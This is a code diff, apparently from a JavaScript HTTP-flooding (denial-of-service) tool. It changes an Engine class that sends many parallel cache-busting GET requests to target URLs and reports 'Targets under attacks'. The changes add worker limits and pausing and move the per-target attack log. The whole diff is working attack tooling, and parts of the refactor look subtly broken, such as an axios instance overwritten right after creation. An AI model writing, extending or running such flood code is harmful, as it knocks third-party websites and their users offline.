@@ -36,9 +36,12 @@ export default class Engine {
         this.updating = false;
         this.paused = false;
         this.waiting = false;
+        this.waitingWorkers = false;
 
         this.id = 0;
         this.workers = [];
+        this.workersReady = 0;
+        this.workersBusy = 0;
         this.results = [];
 
 
@@ -75,6 +78,10 @@ export default class Engine {
     }
 
     enterFrame () {
+        this.workersReady = this.workers.filter(worker => worker.state === "ready").length;
+        this.workersBusy = this.workers.filter(worker => worker.state === "busy").length;
+        this.accuracy = Math.round(((this.codes["2xx"] + this.codes["3xx"] + this.codes["4xx"] + this.codes["5xx"]) / this.requests) * 100) + "%";
+
         // if process has been done
         if (this.done) {
             this.fillCode();
@@ -86,6 +93,15 @@ export default class Engine {
             this.fillCode();
         }
 
+        // set pause if workers limit reached
+        if (!this.waitingWorkers && this.workersBusy >= this.WORKERS_LIMIT) {
+            this.startWaitingWorkers();
+        }
+
+        if (this.waitingWorkers && this.workersReady >= this.WORKERS_READY_MIN) {
+            this.stopWaitingWorkers();
+        }
+
         // set the req/res diff
         this.countedDiff = this.requests - this.responses;
 
@@ -95,11 +111,9 @@ export default class Engine {
         }
 
         // attack if not pause
-        if (!this.preDone && !this.paused) {
-            if (this.everyTimeElapsed(100)) {
-                this.attack();
-                this.fillCode();
-            }
+        if (!this.preDone && !this.paused && this.everyTimeElapsed(100)) {
+            this.attack();
+            this.fillCode();
         }
 
         // prepare for finish process
@@ -141,6 +155,16 @@ export default class Engine {
             this.fillCode();
         }
 
+    }
+
+    startWaitingWorkers () {
+        this.paused = true;
+        this.waitingWorkers = true;
+    }
+
+    stopWaitingWorkers () {
+        this.paused = false;
+        this.waitingWorkers = false;
     }
 
     startWaiting () {
@@ -187,32 +211,15 @@ export default class Engine {
 
         this.results = this.results.filter(item => !item.completed);
 
-        for (let i = streams; i--;) {
-            attack.req++;
-            this.requests++;
-            const controller = new AbortController();
-            let instance = this.workers.find(worker => worker.state === "ready");
-
-            if (!instance) {
-                instance = axios.create({
-                    url,
-                    timeout: this.argv.timeout,
-                    signal: controller.signal,
-                    headers: {
-                        "Cache-Control": "private, no-cache, no-store, must-revalidate, max-age=0",
-                        "Pragma": "no-cache"
-                    }
-                });
-                this.workers.push(instance);
-            }
-            instance.state = "busy";
-            instance.get(url)
+        let request = () => {
+            let instance = axios.request({url})
                 .then((response) => {
                     if (response.status) {
                         this.fillCode(String(response.status).replace(/(\d)\d+/g, "$1xx"));
                     }
-                    instance.state = "ready";
+                    //instance.state = "ready";
                     attack.success++;
+                    instance.state = "ready";
                 })
                 .catch((error) => {
                     if (error.response) {
@@ -226,19 +233,46 @@ export default class Engine {
                         attack.error++;
                         this.fillCode('other');
                     }
+                    instance.state = "ready";
                 })
                 .then(() => {
                     this.responses++;
                     attack.res++;
                     attack.state = Math.round((attack.success / streams) * 100) + "%";
-                    instance.state = "ready";
                     if (attack.res === streams) {
                         attack.completed = true;
                     }
+                    instance.state = "ready";
                 });
+            instance.state = "busy";
+            return instance
+        };
+
+        for (let i = streams; i--;) {
+            attack.req++;
+            this.requests++;
+            let instance = this.workers.find(worker => worker.state === "ready");
+
+            if (!instance) {
+                instance = axios.create({
+                    method: "get",
+                    timeout: this.argv.timeout,
+                    headers: {
+                        "Cache-Control": "private, no-cache, no-store, must-revalidate, max-age=0",
+                        "Pragma": "no-cache"
+                    }
+                });
+                instance = request();
+                this.workers.push(instance);
+            } else {
+                let index = this.workers.indexOf(instance);
+                if (index >= 0) {
+                    this.workers[index] = request();
+                }
+            }
         }
+
         this.fillCode();
-        this.accuracy = Math.round(((this.codes["2xx"] + this.codes["3xx"] + this.codes["4xx"] + this.codes["5xx"]) / this.requests) * 100) + "%";
         global.gc();
     }
 
@@ -318,23 +352,25 @@ export default class Engine {
             string += `Targets under attacks: ${underAttack.length}\r\n`;
             string += `Targets started: ${waitingAttack.length}\r\n`;
             string += `Attacks number: ${this.attacksNumber}\r\n`;
-
-            string += yellow(`\r\n----- Log -----`);
-            for (let i = 0; i < this.RESULTS_LIMIT; i++) {
-                let item = this.results[i];
-                if (item) {
-                    string += `\r\nTarget: ${item.url} | Progress: ${item.res}/${item.req} | Accuracy: ${item.state}`;
-                } else {
-                    string += "\r\n";
-                }
-            }
-            string += "\r\n";
-
         } else if (this.updating) {
             string += `Updating targets...\r\n`;
-        } else if (this.paused) {
+        } else if (this.waiting) {
             string += `Waiting for ${this.countedDiff} responses... ${this.msToTime(this.REQ_RESP_DIFF_TIME - this.waitingTime)}\r\n`;
+        } else if (this.waitingWorkers) {
+            string += `Waiting for ${this.WORKERS_READY_MIN - this.workersReady} workers...`;
         };
+
+        // LOG
+        string += yellow(`\r\n----- Log -----`);
+        for (let i = 0; i < this.RESULTS_LIMIT; i++) {
+            let item = this.results[i];
+            if (item) {
+                string += `\r\nTarget: ${item.url} | Progress: ${item.res}/${item.req} | Accuracy: ${item.state}`;
+            } else {
+                string += "\r\n";
+            }
+        }
+        string += "\r\n";
 
         if (this.preDone && !this.done) {
             string += "\r\nWaiting for rest requests...";
@@ -371,5 +407,13 @@ export default class Engine {
 
     get RESULTS_LIMIT () {
         return parseInt(this.argv.streams / 5)
+    }
+
+    get WORKERS_LIMIT () {
+        return this.argv.workersLimit;
+    }
+
+    get WORKERS_READY_MIN () {
+        return this.argv.readyWorkersMin
     }
 }
